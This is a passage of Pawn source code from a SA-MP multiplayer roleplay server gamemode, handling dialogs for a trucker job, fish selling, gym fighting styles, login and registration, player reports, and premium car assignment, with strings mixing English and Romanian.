	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 9;
			}
			if(listitem == 9)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 2)
	            {
	                format(string,sizeof(string),"You need skill 2 job trucker to transport illegal goods. \nUse /skills to see how many times must deliver goods to skill 2.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 4;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 1)
				{
				    format(string,sizeof(string),"If you choose to deliver the goods stolen will receive 25 %% more money, but you can be arrested if you are caught by police.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 10;

				}
			}
			if(listitem == 10)
	        {
	            format(string,sizeof(string),"If you do not want to risk to be stopped by police or deliver goods explosive, it is the best choice.");
	            ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                Trucker3[playerid] = 11;
			}
			if(listitem == 11)
	        {
	            if(PlayerInfo[playerid][pTruckSkill] < 3)
	            {
	                format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse /skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECTX, DIALOG_STYLE_MSGBOX, "Trucker", string, "Back", "");
                    Trucker4[playerid] = 4;
				}
				else if(PlayerInfo[playerid][pTruckSkill] > 2)
				{
				    format(string,sizeof(string),"You need skill 3 job trucker to carry explosive goods. \nUse / skills to see how many times must deliver goods to skill 3.");
	            	ShowPlayerDialog(playerid, DIALOG_TRUCKSELECT4, DIALOG_STYLE_MSGBOX, "Trucker", string, "Choose", "Back");
                    Trucker3[playerid] = 12;
				}
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_SELLFISH)
	{
	    if(response)
	    {
			GivePlayerCash(playerid, PlayerInfo[playerid][pFishPrice]);
			Update(playerid, pCashx);
			format(string,sizeof(string),"You sold fish for $%d.", PlayerInfo[playerid][pFishPrice]);
			SendClientMessage(playerid, COLOR_GREEN, string);
			PlayerInfo[playerid][pFishPrice] = 0;
			PlayerInfo[playerid][pFishes] = 0;
			PlayerInfo[playerid][pFishTimes]++;
			PlayerInfo[playerid][pFishRem]--;
			Update(playerid,pFishTimesx);
			Update(playerid,pFishRemx);
			if(PlayerInfo[playerid][pFishSkill] <= 5)
			{
				if(PlayerInfo[playerid][pFishRem] <= 0)
				{
					PlayerInfo[playerid][pFishSkill]++;
					if(PlayerInfo[playerid][pFishSkill] == 2)
					{
						PlayerInfo[playerid][pFishRem] = 34;
					}
					else if(PlayerInfo[playerid][pFishSkill] == 3)
					{
						PlayerInfo[playerid][pFishRem] = 49;
					}
					else if(PlayerInfo[playerid][pFishSkill] == 4)
					{
						PlayerInfo[playerid][pFishRem] = 89;
					}
					else if(PlayerInfo[playerid][pFishSkill] == 5)
					{
						PlayerInfo[playerid][pFishRem] = 99;
					}
					Update(playerid,pFishSkillx);
					Update(playerid,pFishRemx);
					format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pFishSkill]);
					SendClientMessage(playerid, COLOR_YELLOW, string);
				}
			}
		}
		return 1;
	}
    if(dialogid == Dialog_Gym)
	{
	    if(response)
	    {
	        new str[256];
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) <= 5999) return SendClientMessage(playerid, COLOR_SERVER, "You don't have enough money.");
                GivePlayerCash(playerid, -6000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
				SendClientMessage(playerid, COLOR_SERVER, "You have successfully purchased this style of fighting.");
				GameTextForPlayer(playerid, "~r~-$6,000", 3000, 1);
				Update(playerid, pCashx);
                PlayerInfo[playerid][pFightStyle] = 1;
				Update(playerid, pFightStylex);
				BizzInfo[InBussines[playerid]][bTill] += 6000;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
            }
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) <= 9999) return SendClientMessage(playerid, COLOR_SERVER, "You don't have enough money.");
                GivePlayerCash(playerid, -10000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
				SendClientMessage(playerid, COLOR_SERVER, "You have successfully purchased this style of fighting.");
				GameTextForPlayer(playerid, "~r~-$10,000", 3000, 1);
				Update(playerid, pCashx);
                PlayerInfo[playerid][pFightStyle] = 2;
				Update(playerid, pFightStylex);
				BizzInfo[InBussines[playerid]][bTill] += 10000;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
            }
			if(listitem == 2)
			{
				if(GetPlayerCash(playerid) <= 9999) return SendClientMessage(playerid, COLOR_SERVER, "You don't have enough money.");
                GivePlayerCash(playerid, -10000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
				SendClientMessage(playerid, COLOR_SERVER, "You have successfully purchased this style of fighting.");
				GameTextForPlayer(playerid, "~r~-$10,000", 3000, 1);
				Update(playerid, pCashx);
				PlayerInfo[playerid][pFightStyle] = 3;
				Update(playerid, pFightStylex);
				BizzInfo[InBussines[playerid]][bTill] += 10000;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
            }
			if(listitem == 3)
			{
				if(GetPlayerCash(playerid) <= 9999) return SendClientMessage(playerid, COLOR_SERVER, "You don't have enough money.");
                GivePlayerCash(playerid, -10000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
				SendClientMessage(playerid, COLOR_SERVER, "You have successfully purchased this style of fighting.");
				GameTextForPlayer(playerid, "~r~-$10,000", 3000, 1);
				Update(playerid, pCashx);
				PlayerInfo[playerid][pFightStyle] = 4;
				Update(playerid, pFightStylex);
				BizzInfo[InBussines[playerid]][bTill] += 10000;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
            }
			if(listitem == 4)
			{
				if(GetPlayerCash(playerid) <= 9999) return SendClientMessage(playerid, COLOR_SERVER, "You don't have enough money.");
                GivePlayerCash(playerid, -10000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_ELBOW);
				SendClientMessage(playerid, COLOR_SERVER, "You have successfully purchased this style of fighting.");
				GameTextForPlayer(playerid, "~r~-$10,000", 3000, 1);
				Update(playerid, pCashx);
				PlayerInfo[playerid][pFightStyle] = 5;
				Update(playerid, pFightStylex);
				BizzInfo[InBussines[playerid]][bTill] += 10000;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
            }
			if(listitem == 5)
			{
				if(GetPlayerCash(playerid) <= 1999) return SendClientMessage(playerid, COLOR_SERVER, "You don't have enough money.");
                GivePlayerCash(playerid, -2000);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
				SendClientMessage(playerid, COLOR_SERVER, "You have successfully purchased this style of fighting.");
				GameTextForPlayer(playerid, "~r~-$2,000", 3000, 1);
				Update(playerid, pCashx);
				PlayerInfo[playerid][pFightStyle] = 0;
				Update(playerid, pFightStylex);
				BizzInfo[InBussines[playerid]][bTill] += 2000;
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[InBussines[playerid]][bTill],InBussines[playerid]);
				mysql_tquery(SQL,str,"","");
            }
		}
    	return 1;
	}
    if(dialogid == DIALOG_LOGIN2 || dialogid == DIALOG_LOGIN3)
	{
	    for(new i; i < sizeof(antisqlinjection); i++)
		{
    		if(strfind(inputtext, antisqlinjection[i], true) != -1)
        	{
   				SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
   				return 1;
      		}
		}
	    if(strlen(inputtext))
	    {
			new tmppass[64];
			mysql_real_escape_string(inputtext, tmppass);
			OnPlayerLogin(playerid,tmppass);
		}
		else
		{
			new stringyy[320];
			gPlayerLogTries[playerid] -= 1;
			if(gPlayerLogTries[playerid] == 1 || gPlayerLogTries[playerid] == 0)
			{
				format(stringyy,sizeof(stringyy),"{FF0000}Incorrect password. You have %d remaining login attempts left.", gPlayerLogTries[playerid]);
				SendClientMessage(playerid, COLOR_RED, stringyy);
			}
			ShowPlayerDialog(playerid,DIALOG_LOGIN2,DIALOG_STYLE_PASSWORD,"SERVER: Login","Welcome to the TopZone RPG Server.\n\nPlease enter your password below!","Login","Cancel");
			if(gPlayerLogTries[playerid] == -1)
			{
			    new stringkick[256],loginname[30];
			    GetPlayerName(playerid, loginname, sizeof(loginname));
		    	format(stringkick, sizeof(stringkick), "[Admin-Warn]: {FFFFFF}%s has been kicked for entering the wrong password 2 times.",loginname);
		   		ABroadCast(COLOR_AdminWarn,stringkick,1);
				Kick(playerid);
			}
		}
	}
    if(dialogid == DIALOG_LOGIN1)
	{
	    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
	    if(strlen(inputtext) >= 4 && strlen(inputtext) <= 30)
	    {
			new tmppass[64];
			mysql_real_escape_string(inputtext, tmppass);
			OnPlayerRegister(playerid,tmppass);
		}
		else
		{
			ShowPlayerDialog(playerid,DIALOG_LOGIN1,DIALOG_STYLE_PASSWORD,"SERVER: Registration","Your password must exceed 4 characters!\n\nWelcome to the TopZone RPG Server.\n\nPlease enter your desired password below!","Register","Cancel");
		}
 	}
 	// REPORT SYSTEM
//ShowPlayerDialog(playerid, DIALOG_REPORT1, DIALOG_STYLE_LIST, "Report", "Contul meu este spart sau blocat\nRaporteaza DM\nRaporteaza un cheater\nIntrebari despre donatii\nSunt blocat/Cad prin mapa\nVreau sa fac o afacere si am nevoie de ajutor\nAlta problema", "OK", "Inchide");
 	if(dialogid == DIALOG_REPORT1)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new string1[256], string2[256], string3[256], string4[256], string5[256],  string6[256], string7[256], string8[256], string9[256], string10[256], string11[256], string12[1024];
			    format(string1, sizeof(string1), "Blocked account");
			    format(string2, sizeof(string2), "If your account is automatically locked you will have to wait 72 hours until it is unlocked.");
				format(string3, sizeof(string3), "If your account is blocked by an admin, open a ticket on wwww.TopZone.ir.");
			    format(string4, sizeof(string4), "From there you can open a ticket for talking to admins about what caused your account blocked.");
			    format(string5, sizeof(string5), "GMs will unlock your game account. It is pointless to ask / report how you can unlock your account. You will not receive response.");
			    format(string6, sizeof(string6), "account hacked");
			    format(string7, sizeof(string7), "If your account is hacked, all you can do is open a ticket and wait for an answer. Usually they are answered in less than 24 hours.");
			    format(string8, sizeof(string8), "If your account has been broken is your fault. Admins not guilty and no one has an obligation to help.");
			    format(string9, sizeof(string9), "However, we try to help playerii that can be helped. So open a ticket and wait for an answer.");
			    format(string10, sizeof(string10), "to open a ticket, enter www.T-Zone.Ir> Ticket> Open ticket again.");
			    format(string11, sizeof(string11), "No Yes /report says administrator to quickly respond to tickets. You will get suspended / and report that.");
     			format(string12, sizeof(string12), "%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",string1,string2,string3,string4,string5,string6,string7,string8,string9,string10,string11);
     			ShowPlayerDialog(playerid, DIALOG_REPORT2, DIALOG_STYLE_MSGBOX, "Cont blocat", string12, "Inchide","");
			}
			if(listitem == 1)
			{
   				ShowPlayerDialog(playerid, DIALOG_REPORTDM1, DIALOG_STYLE_LIST, "Reporting  DM", "I do not know the name of the player that I attacked\nStiu player ID which I attacked", "Select","Back");
			}
			if(listitem == 2)
			{
   				ShowPlayerDialog(playerid, DIALOG_REPORTCH1, DIALOG_STYLE_LIST, "Cheater Report", "I do not know the name of the player who uses cheats \nStiu player ID you use cheats", "Select","Back");
			}
			if(listitem == 3)
			{
			    new string1[256], string2[256], string3[512];
			    format(string1, sizeof(string1), "To donate and receive goods on this server, send an email.");
			    format(string2, sizeof(string2), "MAIL: support@T-Zone.IR \nPE future donations will be made directly from the panel.");
     			format(string3, sizeof(string3), "%s\n%s",string1,string2);
     			ShowPlayerDialog(playerid, DIALOG_REPORT2, DIALOG_STYLE_MSGBOX, "Donations/Payment", string3, "Back","");
			}
			if(listitem == 4)
			{
				new string1[128],playername[30];
				if(ReportTime[playerid] == 1) return SCM(playerid, COLOR_SERVER,"{ba9789}You can send a report once every 3 minutes..");
				GetPlayerName(playerid, playername, sizeof(playername));
				SendClientMessage(playerid, COLOR_YELLOW, "Report submitted.");
   				format(string1,sizeof(string1),"%s [%d] is stuck.",playername,playerid);
				format(reporttext[playerid], sizeof(string1), string1);
				reportreason[playerid] = 1;
				ABroadCast(COLOR_REPORT,string1,1);
				ReportTime[playerid] = 1;
				timerreport[playerid] = 180;
			}
			if(listitem == 5)
			{
				new string1[128],playername[30];
				if(ReportTime[playerid] == 1) return SCM(playerid, COLOR_SERVER,"{ba9789}You can send a report once every 3 minutes..");
				GetPlayerName(playerid, playername, sizeof(playername));
				SendClientMessage(playerid, COLOR_YELLOW, "Report submitted.");
   				format(string1,sizeof(string1),"Report from %s [%d, level %d]: I need an admin for a business!",playername,playerid,PlayerInfo[playerid][pLevel]);
				format(reporttext[playerid], sizeof(string1), string1);
				ABroadCast(COLOR_REPORT,string1,1);
				ReportTime[playerid] = 1;
				timerreport[playerid] = 180;
			}
			if(listitem == 6)
			{
   				ShowPlayerDialog(playerid, DIALOG_REPORT_AP1, DIALOG_STYLE_INPUT, "Another problem", "Write down the problem that you have.\nPlease write 'I need an admin', scrie exact ce problema ai.", "Send","Close");
			}
		}
	}
	if(dialogid == DIALOG_REPORTDM1)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, DIALOG_REPORTDM2, DIALOG_STYLE_INPUT, "Reporting DM player", "Write down what location are players with you attacked.", "Send","Back");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, DIALOG_REPORTDM3, DIALOG_STYLE_INPUT, "Reporting DM player", "Write down ID/name player who attacked you.", "Send","Back");
			}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_REPORT1, DIALOG_STYLE_LIST, "Report", "My account is hacked or blocked\nDM Report\nReport a cheater\nQuestions about donations\nThey are blocked / Cad by map\nI want to make a business and I need help\nAnother problem", "OK", "Back");
		}
	}
	if(dialogid == DIALOG_REPORTCH1)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new string1[256], string2[256], string3[256], string4[1024];
			    format(string1, sizeof(string1), "If you know what id the player uses cheats, uses /cheat.");
			    format(string2, sizeof(string2), "Abusing this feature is sanctioned with a move 2:00 on/report.");
			    format(string3, sizeof(string3), "Write here about player/playerii using cheats.");
			    format(string4, sizeof(string4), "%s\n%s\n%s",string1,string2,string3);
			    ShowPlayerDialog(playerid, DIALOG_REPORTCH2, DIALOG_STYLE_INPUT, "Report player cheats", string4, "Send","Back");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, DIALOG_REPORTCH3, DIALOG_STYLE_MSGBOX, "Report player cheats", "Use /cheat <id> <reason> to report a player chats.", "Back","");
			}
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_REPORT1, DIALOG_STYLE_LIST, "Report", "My account is hacked or blocked\nDM Report\nReport a cheater\nQuestions about donations\nThey are blocked/Cad by map\nI want to make a business and I need help\nAnother problem", "OK", "Back");
		}
	}
	if(dialogid == DIALOG_REPORT_AP1)
	{
		if(response)
		{
			if(strlen(inputtext) < 3) return SCM(playerid, COLOR_ERROR, "You must enter at least 3 characters.");
		    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
	    	if(ReportTime[playerid] == 1) return SCM(playerid, COLOR_SERVER,"{ba9789}You can send a report once every 3 minutes..");
			//new sendername[MAX_PLAYER_NAME], string[300];
			GetPlayerName(playerid, sendername, sizeof(sendername));
            SendClientMessage(playerid, COLOR_YELLOW, "Report submitted.");
			format(string, sizeof(string), "Report from %s [%d, level %d]: %s", sendername,playerid,PlayerInfo[playerid][pLevel],inputtext);
			format(reporttext[playerid], sizeof(string), string);
			ABroadCast(COLOR_REPORT,string,1);
			ReportTime[playerid] = 1;
	  		timerreport[playerid] = 180;
		}
	}
	if(dialogid == DIALOG_REPORTDM2)
	{
	    if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
	    	if(ReportTime[playerid] == 1) return SCM(playerid, COLOR_SERVER,"{ba9789}You can send a report once every three minutes..");
			//new sendername[MAX_PLAYER_NAME], string[300];
			GetPlayerName(playerid, sendername, sizeof(sendername));
		    SendClientMessage(playerid, COLOR_YELLOW, "Report submitted.");
			format(string, sizeof(string), "Report from %s [%d, level %d]: %s", sendername,playerid,PlayerInfo[playerid][pLevel],inputtext);
			format(reporttext[playerid], sizeof(string), string);
			ABroadCast(COLOR_REPORT,string,1);
			ReportTime[playerid] = 1;
  			timerreport[playerid] = 180;
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_REPORTDM1, DIALOG_STYLE_LIST, "DM Report", "I do not know the name of the player that I attacked \nStiu player ID which I attacked", "Select","Back");
		}
	}
	if(dialogid == DIALOG_REPORTDM3)
	{
		if(response)
		{
		    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
			if(ReportTime[playerid] == 1) return SCM(playerid, COLOR_SERVER,"{ba9789}You can send a report once every 3 minutes..");
			//new sendername[MAX_PLAYER_NAME],string[300];
			if(!IsNumeric(inputtext)) return SCM(playerid, COLOR_SERVER,"Invalid ID.");
			new id = strval(inputtext),namee[30];
			if(!IsPlayerConnected(id)) return SCM(playerid, COLOR_SERVER,"Player not connected.");
			GetPlayerName(playerid, sendername, sizeof(sendername));
			GetPlayerName(id, namee, sizeof(namee));
            SendClientMessage(playerid, COLOR_YELLOW, "Report submitted.");
			format(string, sizeof(string), "%s [%d] was reported for DM by %s.", sendername,playerid,namee);
			format(reporttext[playerid], sizeof(string), string);
			reportreason[id] = 2;
			playerreported[playerid] = id;
			ABroadCast(COLOR_REPORT,string,1);
			ReportTime[playerid] = 1;
	  		timerreport[playerid] = 180;
		}
	  	else
		{
		    ShowPlayerDialog(playerid, DIALOG_REPORTDM1, DIALOG_STYLE_LIST, "Raportare DM", "Nu stiu numele playerului care m-a atacat\nStiu ID-ul playerului care m-a atacat", "Selecteaza","Inapoi");
		}
	}
	if(dialogid == DIALOG_REPORTCH2)
	{
	    if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "Nu sunt permise asemenea caractere.");
      				return 1;
		        }
			}
	    	if(ReportTime[playerid] == 1) return SCM(playerid, COLOR_SERVER,"{ba9789}Poti trimite un report odata la 3 minute..");
			//new sendername[MAX_PLAYER_NAME],string[300];
			GetPlayerName(playerid, sendername, sizeof(sendername));
            SendClientMessage(playerid, COLOR_YELLOW, "Report submitted.");
			format(string, sizeof(string), "Report from %s [%d, level %d]: %s", sendername,playerid,PlayerInfo[playerid][pLevel],inputtext);
			format(reporttext[playerid], sizeof(string), string);
			ABroadCast(COLOR_REPORT,string,1);
			ReportTime[playerid] = 1;
  			timerreport[playerid] = 180;
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_REPORTCH1, DIALOG_STYLE_LIST, "Raportare Cheater", "Nu stiu numele playerului ce foloseste cheat-uri\nStiu ID-ul playerului ce foloseste cheat-uri", "Selecteaza","Inapoi");
		}
	}
	// END REPORT SYSTEM
	return 1;
}

forward SetPlayerHealthEx(playerid, Float:health);
public SetPlayerHealthEx(playerid, Float:health)
{
	SetPlayerHealth(playerid, health);
	Health[playerid] = health;
	return 1;
}

forward GetPlayerHealthEx(playerid, &Float:health);
public GetPlayerHealthEx(playerid, &Float:health)
{
	health = Health[playerid];
	return 1;
}

forward SetPlayerArmourEx(playerid, Float:armour);
public SetPlayerArmourEx(playerid, Float:armour)
{
	SetPlayerArmour(playerid, armour);
	Armour[playerid] = armour;
	return 1;
}

forward GetPlayerArmourEx(playerid, &Float:armour);
public GetPlayerArmourEx(playerid, &Float:armour)
{
	armour = Armour[playerid];
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	new iswar = 0, attackers, defenders;
    if(GoChase[playerid] < 999) ShowPlayerNameTagForPlayer(forplayerid, playerid, 0);

    for(new i = 1; i < sizeof(Turfs) && iswar == 0; i++)
    {
        attackers = WarInfo[i][wAttacker];
		defenders = WarInfo[i][wFaction];
        if(WarInfo[i][wTime] > 1 && attackers != 0 && defenders != 0)
        {
			if( (PlayerInfo[playerid][pMember] == attackers || PlayerInfo[playerid][pMember] == defenders) && (PlayerInfo[forplayerid][pMember] == attackers || PlayerInfo[forplayerid][pMember] == defenders) ) iswar = 1;
		}
    }

	if(iswar == 1)
	{
		if( (PlayerInfo[playerid][pMember] == attackers || PlayerInfo[playerid][pMember] == defenders) && (PlayerInfo[forplayerid][pMember] == attackers || PlayerInfo[forplayerid][pMember] == defenders) )
		{
			SetPlayerMarkerForPlayer( playerid, forplayerid, GetPlayerColor( forplayerid ) );
			SetPlayerMarkerForPlayer( forplayerid, playerid, GetPlayerColor( playerid ) );
		}
		else
		{
			SetPlayerMarkerForPlayer( playerid, forplayerid, ( GetPlayerColor( forplayerid ) & 0xFFFFFF00 ) );
			SetPlayerMarkerForPlayer( forplayerid, playerid, ( GetPlayerColor( playerid ) & 0xFFFFFF00 ) );
		}
	}
	else
	{
		SetPlayerMarkerForPlayer( playerid, forplayerid, ( GetPlayerColor( forplayerid ) & 0xFFFFFF00 ) );
		SetPlayerMarkerForPlayer( forplayerid, playerid, ( GetPlayerColor( playerid ) & 0xFFFFFF00 ) );
	}
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
    SetPlayerMarkerForPlayer( playerid, forplayerid, ( GetPlayerColor( forplayerid ) & 0xFFFFFF00 ) );
	SetPlayerMarkerForPlayer( forplayerid, playerid, ( GetPlayerColor( playerid ) & 0xFFFFFF00 ) );
	return 1;
}

// CAR SYSTEM
public IsAnOwnableCar(vehicleid)
{
	if(OwnedVeh(vehicleid) != 0) { return 1; }
	return 0;
}


// PREMIUM CARS
public InsertPCar(playerid,model,value,namecar[],type)
{
    new sendername[25],var100[512];
    masini+=1;
    new idd = masini;
    GetPlayerName(playerid,sendername,sizeof(sendername));
    if(idd != 0)
	{
        if(type == 1)
        {
            if(PlayerInfo[playerid][pPcarkey] == 0)
			{
				PlayerInfo[playerid][pPcarkey] = idd;
				Update(playerid,pPcarkeyx);
				pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
				CarInfo[idd][cAngle] = 30.000;
				DespawnCar[playerid][0] = 600;
			}
			else
			{
				new masinii = 0;
				if(PlayerInfo[playerid][pPcarkey] > 0) masinii++;
				if(PlayerInfo[playerid][pmotokey] > 0) masinii++;
				if(PlayerInfo[playerid][pprcarkey] > 0) masinii++;
				if(PlayerInfo[playerid][pprcarkey2] > 0) masinii++;
				if(PlayerInfo[playerid][pPPluscarkey] > 0) masinii++;
				if(PlayerInfo[playerid][pPPluscarkey2] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey7] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey8] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey9] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey10] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey11] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey12] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey13] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey14] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey15] > 0) masinii++;
				if(PlayerInfo[playerid][pVip] < 1 && masinii >= 10) return SCM(playerid, COLOR_ERROR, "Contul tau este unul Standard, nu poti detine mai multe vehicule.");
				if(masinii >= 15) return SCM(playerid, COLOR_ERROR, "Ai ajuns la numarul maxim de vehicule.");
				if(PlayerInfo[playerid][pmotokey] == 0)
				{
					PlayerInfo[playerid][pmotokey] = idd;
					Update(playerid,pmotokeyx);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
					CarInfo[idd][cAngle] = 30.000;
					DespawnCar[playerid][1] = 600;
				}
				else if(PlayerInfo[playerid][pprcarkey] == 0)
				{
					PlayerInfo[playerid][pprcarkey] = idd;
					Update(playerid,pprcarkeyx);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
					CarInfo[idd][cAngle] = 30.000;
					DespawnCar[playerid][2] = 600;
				}
				else if(PlayerInfo[playerid][pprcarkey2] == 0)
				{
					PlayerInfo[playerid][pprcarkey2] = idd;
					Update(playerid,pprcarkey2x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
					CarInfo[idd][cAngle] = 30.000;
					DespawnCar[playerid][3] = 600;
				}
				else if(PlayerInfo[playerid][pPPluscarkey] == 0)
				{
					PlayerInfo[playerid][pPPluscarkey] = idd;
					Update(playerid,pPPluscarkeyx);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][4] = 600;
				}
				else if(PlayerInfo[playerid][pPPluscarkey2] == 0)
				{
					PlayerInfo[playerid][pPPluscarkey2] = idd;
					Update(playerid,pPPluscarkey2x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][5] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey7] == 0)
				{
					PlayerInfo[playerid][pCarkey7] = idd;
					Update(playerid,pCarkey7x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][6] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey8] == 0)
				{
					PlayerInfo[playerid][pCarkey8] = idd;
					Update(playerid,pCarkey8x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][7] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey9] == 0)
				{
					PlayerInfo[playerid][pCarkey9] = idd;
					Update(playerid,pCarkey9x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][8] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey10] == 0)
				{
					PlayerInfo[playerid][pCarkey10] = idd;
					Update(playerid,pCarkey10x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][9] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey11] == 0)
				{
					PlayerInfo[playerid][pCarkey11] = idd;
					Update(playerid,pCarkey11x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
